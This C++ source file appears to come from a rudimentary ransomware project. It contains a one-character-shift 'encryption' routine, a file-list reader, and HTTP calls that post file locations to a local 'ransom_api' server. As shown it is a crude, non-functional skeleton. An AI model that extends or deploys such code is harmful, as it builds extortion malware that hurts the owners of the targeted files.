#include <string>
#include "HTTPRequest.hpp"


//Function to read locations and push them into a vector.
bool getFileContents(std::string fileName, std::vector<std::string> & fileContents){  

    std::ifstream in(fileName);  
    if(!in){
        std::cerr << "Cannot open the File : " << fileName << std::endl;
        return false;
    }
    std::string str;    
    while (getline(in, str)){        
        if(str.size() > 0)
            fileContents.push_back(str);
    }    
    in.close();
    return true;
}


//Basic function to read all chars and increment them by one. 
void basicEncryptContent(std::string& content){
	for(char& chr : content){
		chr = chr + 1;
	}
}


//Basic function to read all chars and decrement them by one.
void basicDecryptContent(std::string& content){
	for(char& chr : content){
		chr = chr - 1;
	}
}


//Get request to ransom_api.
std::string get_request(std::string uri){
      try{
        
        http::Request request{uri};

        // send a get request
        const auto response = request.send("GET");      
        return std::string{response.body.begin(), response.body.end()};
        
    
    }
    catch (const std::exception& e){
        std::cerr << "Request failed, error: " << e.what() << '\n';
        return std::string{"Did not work"};
        
    } 
}


//Post Request to ransom_api.
void post_request(std::string body){
    try
    {
        http::Request request("http://127.0.0.1:5000/locations");  
        std::string a = "{\"file_location\": \""; //TODO - Make this work and not three strings lol
        std::string b = body;
        std::string c = "\"}";      
        const std::string body = a + b + c;
        const auto response = request.send("POST", body, {
            "Content-Type: application/json"
        });
        std::cout << std::string{response.body.begin(), response.body.end()} << '\n'; // print the result
    }
    catch (const std::exception& e)
    {
        std::cerr << "Request failed, error: " << e.what() << '\n';
    }
}


//Splits string into chunks bassed on char delimiter.
void tokenize(std::string const &str, const char delim, 
            std::vector<std::string> &out) 
{ 
    // construct a stream from the string 
    std::stringstream ss(str); 
 
    std::string s; 
    while (std::getline(ss, s, delim)) { 
        out.push_back(s); 
    } 
} 


// *** Will replace with some kind of library. This is a hacky mess. REPLACE
std::vector<std::string> hackyMessJsonSanitizer(std::string & serverStoredLocationsRaw){


        std::string serverStoredLocationsString = "";
    for (auto it = serverStoredLocationsRaw.cbegin(); it != serverStoredLocationsRaw.cend(); ++it) {        
        serverStoredLocationsString = serverStoredLocationsString + *it;
    }
    serverStoredLocationsString.erase(remove(serverStoredLocationsString.begin(), serverStoredLocationsString.end(), ','), serverStoredLocationsString.end());
    serverStoredLocationsString.erase(remove(serverStoredLocationsString.begin(), serverStoredLocationsString.end(), '{'), serverStoredLocationsString.end());
    serverStoredLocationsString.erase(remove(serverStoredLocationsString.begin(), serverStoredLocationsString.end(), '}'), serverStoredLocationsString.end());
    serverStoredLocationsString.erase(remove(serverStoredLocationsString.begin(), serverStoredLocationsString.end(), ' '), serverStoredLocationsString.end());
    serverStoredLocationsString.erase(remove(serverStoredLocationsString.begin(), serverStoredLocationsString.end(), '['), serverStoredLocationsString.end());

    const char delim = '\n'; 
 
    std::vector<std::string> out; 
    tokenize(serverStoredLocationsString, delim, out); 
    out.erase(out.begin());
    out.erase(out.begin());
    std::vector<std::string> out2;
    std::string tempString = "";
 
    for (auto &fis: out) {
         
        if(fis.find('l') != std::string::npos){         
            for(std::string::iterator it = fis.begin() + 12; it != fis.end() - 1; ++it) {
                tempString = tempString + *it;
            }
        }
        out2.push_back(tempString);
        tempString = "";       
         
    } 

    out2.erase(
    std::remove_if(out2.begin(), out2.end(), 
        [](const std::string &s) {return s.find(' ') != std::string::npos;} 
    ), 
    out2.end()
);

    return out2;
}